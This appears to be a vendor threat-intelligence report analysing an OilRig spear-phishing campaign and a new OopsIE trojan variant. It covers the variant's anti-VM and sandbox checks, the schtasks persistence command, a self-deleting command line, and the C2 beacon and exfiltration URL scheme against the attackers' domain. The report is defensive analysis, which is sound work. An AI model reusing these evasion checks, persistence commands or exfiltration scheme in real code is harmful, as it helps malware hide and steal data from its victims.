The OilRig group maintains their persistent attacks against government entities in the Middle East
region using previously identified tools and tactics. As observed in previous attack campaigns, the
tools used are not an exact duplicate of the previous attack and instead is an iterative variant. In this
instance a spear phishing email was used containing a lure designed to socially engineer and entice the
victim to executing a malicious attachment. The attachment was identified as a variant of the OopsIE
trojan we identified in February 2018. In this iteration of OopsIE, the general functionality largely
remained the same but contained the addition of anti-analysis and anti-virtual machine capabilities to
further evade detection from automated defensive systems.

Attack Details
In July 2018, we reported on a wave of OilRig attacks delivering a tool called QUADAGENT involving
a Middle Eastern government agency. During that wave, we also observed OilRig leveraging additional
compromised email accounts at the same government organization to send spear phishing emails
delivering the OopsIE trojan as the payload instead of QUADAGENT. The OopsIE attack also targeted
a government agency within the same nation state, though a different organization than the one
targeted delivering QUADAGENT. The email subject was in Arabic, which translated to “Business
continuity management training”. The email was sent to an address belonging to a user group, rather
than a specific individual’s email address. Based on open source data collection, it appears the
targeted group had publicly published several documents regarding business continuity management
on the Internet, indicating the lures were purposefully crafted for this specific attack.

 

Evasion Techniques
The OopsIE variant delivered in this attack begins its execution by performing a series of anti-VM and
sandbox checks. If any of the checks described in Table 1 are successful, the Trojan will exit without
running any of its functional code. These evasion techniques are meant to thwart automated analysis
in an effort to avoid detection.

Fan Check The Trojan will perform the following WMI query:

 

Select * from Win32_Fan

 

According to MSDN, this query should return a class that provides statistics
on the CPU fan. The Trojan checks to see if the result of this query returned
a class with more than 0 elements, which would most likely be true in a non-
virtual environment.

Temperature
Check

The Trojan will perform the following WMI query:

 

SELECT * FROM MSAcpi_ThermalZoneTemperature

 

The Trojan will specifically attempt to get the CurrentTemperature value
from this object and will check to see if the attempt results in an error that
contains the word supported. This is meant to find the result of Not
supported, which is the result if run in a virtual machine.

Mouse Pointer
Check

The Trojan will perform the following WMI query:

 

Select * from Win32_PointingDevice

 

The Trojan will check the Caption, Description, HardwareType, InfSection,
Manufacturer and Name fields in the results for the string VMware, Virtual,
VBox, VM or Oracle.

https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


Hard Disk
Check

The Trojan will perform the following WMI query:

 

Select * from Win32_DiskDrive

 

The Trojan will check the Caption and Model fields in the results for the
strings Virtual, VMWare, VM, VBox or Oracle.

Motherboard
Check

The Trojan will perform the following WMI query:

 

Select * from Win32_BaseBoard

 

The Trojan will check the Manufacturer and Product fields in the results for
the strings VMware, Virtual, VBox, VM or Oracle.

Sandboxie DLL
Check

The Trojan will attempt to load the SbieDll.dll module via LoadLibrary.

VBox DLL
Check

The Trojan checks to see if the file vboxmrxnp.dll exists in the system
directory.

VMware DLL
Check

The Trojan checks to see if the files vmGuestLib.dll or vmbusres.dll exist in
the system directory.

Timezone
Check

The Trojan check to see if the system is configured (“DaylightName”) with
one of the following time zones:

 

Arabic Daylight Time (UTC+3)

Arab Daylight Time (UTC+3)

Arabian Daylight Time (UTC+4)

Middle East Daylight Time (UTC+2)

Iran Daylight Time (UTC+3.5)

Human
Interaction
Check

Before executing its functional code, the Trojan presents a dialog box with
the following line of code:

 

Interaction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3),
MsgBoxStyle.Critical, null);

 

This dialog box displays  An error occurred while processing user32.dll!,
which the user must click the ok button for the Trojan to run its functional
code.

Table 1 List of anti-vm and anti-sandbox techniques used by OopsIE

 

Most of these evasion techniques have been observed in other malware families; however, a few of
the techniques were more novel. First, we had not seen the CPU fan check used before, and upon
testing the WMI query in a VMware Windows 7 virtual machine we saw no result, as seen in Figure 1

https://pdfmyurl.com/?src=pdf


Figure 1 WMI query for the Win32_Fan class on a VM returning no statistics

However, when we ran the same query in a physical system running Windows 7, we saw the contents
of the Win32_Fan class, as seen in Figure 2. The OopsIE payload checks to see if the result of this
query as more than 0 elements to determine if it is running on a virtual machine.

Figure 2 WMI query for Win32_Fan run on a physical system showing statistics

Secondly, the CPU temperature check seen in this payload was previously used by GravityRAT, as

https://pdfmyurl.com/?src=pdf


discussed earlier this year by security researchers at Talos. They noted that while virtual machines
were detected by this technique, some physical systems were also detected as virtual machines
because they did not support the WMI query. This suggests that other WMI-based VM detection
techniques may also detect certain physical systems if those systems do not support the specific WMI
query.

The last technique that was particularly interesting is the time zone check, as the Trojan will not
execute its functional code if the system does not have a specific time zone set. The Trojan compares
the TimeZone.CurrentTimeZone.DaylightName property to strings Iran, Arab, Arabia and Middle East,
which will match the following time zones in Windows:

 

Arabic Daylight Time (UTC+3)

Arab Daylight Time (UTC+3)

Arabian Daylight Time (UTC+4)

Middle East Daylight Time (UTC+2)

Iran Daylight Time (UTC+3.5)

According to MSDN, these five time zones encompass 10 countries that fall within UTC+2, +3, +3.5 or
+4 as seen in Figure 3. The fact that the Trojan will not operate on systems that are not configured
with these time zones suggests that this is a highly targeted attack focused on a specific subset of
target nations.

Notable Differences
The OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE
variant discussed in our previous blog. The main similarities include the use of a scheduled task to
persistently execute on the system, as well as the same general process to communicate with its C2
server. For instance, this Trojan uses the InternetExplorer application object much like the previous
OopsIE Trojan and a very similar sequence of requests to obtain commands. Also, this version of the
Trojan inspects HTTP responses from the C2 server for the tags <pre> and </pre> and will parse that
data for commands.

However, there are many differences introduced to this version of OopsIE from the previously

https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


discussed variant. At face value, this current variant of OopsIE has a vast majority of its strings
obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter,
treating each split value as an integer, subtracting one from each integer and converting each into a
character. The following code snippet was used to decode strings within OopsIE:

When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis
environment, as discussed in the previous section. The last check requires the user to click the ‘Ok’
button in an error dialog box, as seen in Figure 4.

Figure 4 Error dialog box displayed by OopsIE

After displaying the error dialog box, the Trojan will sleep for two seconds by running the following
command that runs the choice application. The use of the choice command, as seen below, did not
appear in previous versions of OopsIE and appears to have been added in the most recent version used
in this attack.

cmd.exe /C choice /C Y /N /D Y /T 2 & Del

After sleeping, the Trojan will create a GUID and write it to %APPDATA%\Windows\GDI.bin. It then

https://pdfmyurl.com/?src=pdf


moves itself to %APPDATA%\Windows\WindowsImplantment.exe and sets both of these files to
have the hidden and system flags to hide them from the user.

With the Trojan moved its final location, it will then create a scheduled task to run a VBScript to make
sure it runs persistently. The Trojan accesses two resources, named Sch and VBS that contains
obfuscated strings that contain the command to create the scheduled task and the VBScript to run.
The decoded string from the Sch resource is:
SchTasks /Create /SC MINUTE /MO 3 /TN “%n%” /TR “wscript %path%” /f

The decoded string from the VBS resource is:

CreateObject(“WScript.Shell”).Run(“%app%”)

The %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin. This
differs from the previous OopsIE variant that used a hardcoded task name for the scheduled task. The
%path% string in the scheduled task command will be replaced with the path to the following:

%APPDATA%\Windows\ShwDoc.VBS

The decoded string from the VBS resource is written to ShwDoc.VBS. The %app% string in the
VBScript is replaced with %APPDATA%\Windows\WindowsImplantment.exe. This process ultimately
attempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled
task as it does not include a main loop to continue its execution.

After creating this scheduled task for persistence, the Trojan will begin communicating with its C2
server. The process in which the Trojan communicates with its C2 server is very similar to the previous
OopsIE Trojan that we discussed in our previous blog. This particular sample uses the following
domain as its C2 server:

www.windowspatch[.]com

One obvious difference between this version of OopsIE compared to the previously analyzed version
is the strings in the C2 URLs are reversed, from chk to khc, what to tahw and resp to pser. Also, the
oops string used to signify and erroneous transmission from the C2, which gave OopsIE its name is
reversed to spoo. Also, this variant of OopsIE uses the output of the whoami command as the
parameter within the URL when communicating with the C2 server, which differs from the previous
OopsIE variant that used the hostname and username from the environment variables. The C2

Convert webpages or entire websites to PDF - PDFmyURL!

https://pdfmyurl.com/?src=pdf
https://pdfmyurl.com/?src=pdf


communications begins with a beacon to the following URL:

hxxp://www.windowspatch[.]com/khc?<hex(STDOUT of whoami command)>

If the C2 server wishes to send a command, it will respond to the beacon above by echoing the
whoami command results sent by the Trojan to the C2 in the URL. If the Trojan receives this echo, it
will create the following file that the Trojan uses as a signal that it was able to successfully
communicate with its C2 server:

%APPDATA%\Windows\ShwDoc.srv

If the Trojan determines the C2 server wishes to send a command, it sends an HTTP request to the
following URL:

hxxp://www.windowspatch[.]com/tahw?<hex(STDOUT of whoami command)>

The Trojan will first check the response to this request for the string spoo, which signifies the C2 does
not wish to issue a command. Otherwise, the Trojan will attempt to parse the response for a
command, specifically by splitting the decode response on <> and treating the text to the left of the
<> string as the command the text to the right as the command arguments. The command handler in
this OopsIE variant is very similar to the previous version, as it contains the same three (1, 2 and 3)
commands seen in Table 2. The one difference in this command handler from the previous version is
the boom! command, which allows the actor to uninstall the OopsIE Trojan from the system.

Command Description

1 Runs a supplied command and writes it output to
%APPDATA%\SchWin.vbs, which will then be uploaded to the C2 server.

2 Downloads a file to the system. Splits argument on “(|)”, with the string to
the left representing the filename to save and the string to the right
representing the data to write to the file.

3 Read specified file and uploads its contents to the C2 server.

boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the
scheduled task whose name a GUID stored in the GID.bin file.

When sending data to the C2 server after running commands, the Trojan will use the following URL
structure with either BBY or BBZ splitting the whoami output and the exfiltrated data:

http://www.windowspatch.com/pser?<hex(STDOUT of whoami command)
(BBZ|BBY)hex(up to 1000 bytes of hexadecimal data)>

 

Conclusion
The OilRig group remains a persistent adversary in the Middle East region. They continue to iterate
and add capabilities to their tools while still functionally using the same tactics over and over again.
Within the time frame we have been tracking the OilRig group, they have repeatedly shown a
willingness to add less commonly found functionality to their tools, such as their heavy use of DNS
tunneling in their backdoors or adding authentication to their webshells. This attack is no different,
now adding anti-analysis capabilities into their tools. This adversary is highly resourceful and
continues to adapt over time. However, the tactics they continue to deploy are generally
unsophisticated, and simple security hygiene would help organizations protect themselves against this
threat.

Palo Alto Networks customers are protected from this OilRig attack campaign and OopsIE by:

AutoFocus customers can track this Trojan with the OopsIE tag
All known OopsIE samples are marked with malicious verdicts in WildFire
All known OopsIE C2 domains have DNS signatures and are classified as Command and Control
